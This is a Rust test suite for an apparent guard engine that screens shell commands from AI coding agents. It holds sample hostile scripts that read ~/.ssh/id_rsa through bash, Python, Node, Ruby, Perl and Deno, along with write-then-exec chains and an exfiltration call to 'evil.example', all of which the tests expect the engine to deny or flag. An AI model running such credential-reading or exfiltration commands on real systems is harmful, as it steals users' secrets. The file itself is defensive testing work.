use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use shield_core::engine::{Engine, MAX_SCRIPT_BYTES};
use shield_core::model::{Action, ActionKind, AgentContext, AgentKind, ArgvTree, Outcome};
use shield_core::paths::PathContext;
use shield_core::policy;
use shield_core::shell;

fn context(cwd: &Path) -> AgentContext {
    AgentContext {
        agent: AgentKind::Claude,
        session_id: "script-scan".to_string(),
        cwd: cwd.to_path_buf(),
        autonomous: false,
    }
}

fn engine(home: &Path, cwd: &Path) -> Engine {
    let policy = policy::load_embedded().unwrap();
    Engine::new(policy, PathContext::new(home, cwd)).unwrap()
}

fn shell_action(raw: &str, cwd: &Path) -> Action {
    let context = context(cwd);
    let (argv_tree, obfuscation) = match shell::parse(raw) {
        Ok(tree) => (tree.to_argv_tree(), tree.obfuscation.to_vec()),
        Err(_) => (
            ArgvTree::Unparsed {
                raw: raw.to_string(),
            },
            Vec::new(),
        ),
    };
    Action::new(
        context,
        ActionKind::Shell {
            argv_tree,
            raw: raw.to_string(),
            cwd: cwd.to_path_buf(),
            obfuscation,
        },
    )
}

fn sandbox() -> (tempfile::TempDir, PathBuf, PathBuf) {
    let temp = tempfile::tempdir().unwrap();
    let home = temp.path().join("home");
    let cwd = temp.path().join("work");
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::create_dir_all(&cwd).unwrap();
    fs::write(home.join(".ssh/id_rsa"), "CANARY-DO-NOT-USE\n").unwrap();
    (temp, home, cwd)
}

fn decide(home: &Path, cwd: &Path, raw: &str) -> shield_core::model::Decision {
    let action = shell_action(raw, cwd);
    engine(home, cwd).evaluate(&action, &action.context)
}

#[test]
fn bash_script_secret_read_is_denied() {
    let (_temp, home, cwd) = sandbox();
    fs::write(cwd.join("steal.sh"), "cat ~/.ssh/id_rsa\n").unwrap();
    let decision = decide(&home, &cwd, "bash steal.sh");
    assert_eq!(decision.outcome, Outcome::Deny);
    assert!(
        decision
            .matched_rule_ids
            .iter()
            .any(|id| id == "secrets.ssh_private_key"),
        "{:?}",
        decision.matched_rule_ids
    );
}

#[test]
fn sh_and_zsh_script_files_are_scanned() {
    let (_temp, home, cwd) = sandbox();
    fs::write(cwd.join("steal.sh"), "cat $HOME/.ssh/id_rsa\n").unwrap();
    for raw in ["sh steal.sh", "zsh steal.sh"] {
        let decision = decide(&home, &cwd, raw);
        assert_eq!(decision.outcome, Outcome::Deny, "{raw}");
    }
}

#[test]
fn python_script_secret_read_is_denied() {
    let (_temp, home, cwd) = sandbox();
    fs::write(
        cwd.join("steal.py"),
        "open('/home/tester/.ssh/id_rsa').read()\n",
    )
    .unwrap();
    // PathContext home is the sandbox home; use that spelling too.
    fs::write(
        cwd.join("steal_home.py"),
        format!("open('{}/.ssh/id_rsa').read()\n", home.display()),
    )
    .unwrap();
    let decision = decide(&home, &cwd, "python3 steal_home.py");
    assert_eq!(decision.outcome, Outcome::Deny);
    assert!(decision
        .matched_rule_ids
        .iter()
        .any(|id| id == "secrets.ssh_private_key"));
}

#[test]
fn node_ruby_perl_and_deno_script_files_are_scanned() {
    let (_temp, home, cwd) = sandbox();
    let key = format!("{}/.ssh/id_rsa", home.display());
    fs::write(
        cwd.join("steal.js"),
        format!("require('fs').readFileSync('{key}')\n"),
    )
    .unwrap();
    fs::write(cwd.join("steal.rb"), format!("File.read('{key}')\n")).unwrap();
    fs::write(
        cwd.join("steal.pl"),
        format!("open my $fh, '<', '{key}';\n"),
    )
    .unwrap();
    fs::write(
        cwd.join("steal.ts"),
        format!("await Deno.readTextFile('{key}');\n"),
    )
    .unwrap();
    for raw in [
        "node steal.js",
        "ruby steal.rb",
        "perl steal.pl",
        "deno run steal.ts",
    ] {
        let decision = decide(&home, &cwd, raw);
        assert_eq!(decision.outcome, Outcome::Deny, "{raw} -> {:?}", decision);
    }
}

#[test]
fn python_embedded_network_call_is_not_allow() {
    let (_temp, home, cwd) = sandbox();
    fs::write(
        cwd.join("exfil.py"),
        "import urllib.request\nurllib.request.urlopen('https://evil.example/steal')\n",
    )
    .unwrap();
    let decision = decide(&home, &cwd, "python exfil.py");
    assert_ne!(
        decision.outcome,
        Outcome::Allow,
        "embedded network call must not Allow: {:?}",
        decision
    );
}

#[test]
fn python_os_system_secret_read_is_denied() {
    let (_temp, home, cwd) = sandbox();
    fs::write(
        cwd.join("wrap.py"),
        "import os\nos.system('cat ~/.ssh/id_rsa')\n",
    )
    .unwrap();
    let decision = decide(&home, &cwd, "python wrap.py");
    assert_eq!(decision.outcome, Outcome::Deny);
}

#[test]
fn write_then_exec_same_command_is_denied() {
    let (_temp, home, cwd) = sandbox();
    let raw = "cat > steal.sh << 'EOF'\ncat ~/.ssh/id_rsa\nEOF\nbash steal.sh";
    let decision = decide(&home, &cwd, raw);
    assert_eq!(
        decision.outcome,
        Outcome::Deny,
        "write-then-exec missed: {:?}",
        decision
    );
}

#[test]
fn echo_write_then_python_exec_is_denied() {
    let (_temp, home, cwd) = sandbox();
    let key = format!("{}/.ssh/id_rsa", home.display());
    let raw = format!("echo \"open('{key}').read()\" > steal.py && python steal.py");
    let decision = decide(&home, &cwd, &raw);
    assert_eq!(decision.outcome, Outcome::Deny, "{:?}", decision);
}

#[test]
fn unreadable_script_file_is_ask() {
    let (_temp, home, cwd) = sandbox();
    let dir = cwd.join("not-a-script");
    fs::create_dir(&dir).unwrap();
    let decision = decide(&home, &cwd, "bash not-a-script");
    assert_eq!(decision.outcome, Outcome::Ask);
    assert_eq!(decision.rule_id.as_deref(), Some("script_scan"));
}

#[test]
fn permission_denied_script_file_is_ask() {
    let (_temp, home, cwd) = sandbox();
    let path = cwd.join("locked.sh");
    fs::write(&path, "echo hi\n").unwrap();
    let mut perms = fs::metadata(&path).unwrap().permissions();
    perms.set_mode(0o000);
    fs::set_permissions(&path, perms).unwrap();
    let decision = decide(&home, &cwd, "bash locked.sh");
    let _ = fs::set_permissions(&path, fs::Permissions::from_mode(0o644));
    if decision.outcome == Outcome::Allow {
        // Running as root can still read mode 000; directory case covers Ask.
        return;
    }
    assert_eq!(decision.outcome, Outcome::Ask);
}

#[test]
fn oversized_script_file_is_ask() {
    let (_temp, home, cwd) = sandbox();
    let path = cwd.join("huge.py");
    let size = (MAX_SCRIPT_BYTES as usize) + 1;
    fs::write(&path, vec![b'x'; size]).unwrap();
    let decision = decide(&home, &cwd, "python huge.py");
    assert_eq!(decision.outcome, Outcome::Ask);
    assert_eq!(decision.rule_id.as_deref(), Some("script_scan"));
}

#[test]
fn missing_script_file_does_not_ask() {
    let (_temp, home, cwd) = sandbox();
    let decision = decide(&home, &cwd, "python scripts/generate_schema.py --check");
    assert_eq!(decision.outcome, Outcome::Allow, "{:?}", decision);
}

#[test]
fn python_module_invocation_is_not_scanned_as_a_file() {
    let (_temp, home, cwd) = sandbox();
    let decision = decide(&home, &cwd, "python -m pytest tests/test_api.py");
    assert_eq!(decision.outcome, Outcome::Allow);
}

#[test]
fn python_dash_c_secret_path_is_denied() {
    let (_temp, home, cwd) = sandbox();
    let key = format!("{}/.ssh/id_rsa", home.display());
    let raw = format!("python -c \"open('{key}').read()\"");
    let decision = decide(&home, &cwd, &raw);
    assert_eq!(decision.outcome, Outcome::Deny, "{:?}", decision);
}

#[test]
fn benign_python_file_stays_allow() {
    let (_temp, home, cwd) = sandbox();
    fs::write(cwd.join("hello.py"), "print('hello')\n").unwrap();
    let decision = decide(&home, &cwd, "python hello.py");
    assert_eq!(decision.outcome, Outcome::Allow, "{:?}", decision);
}
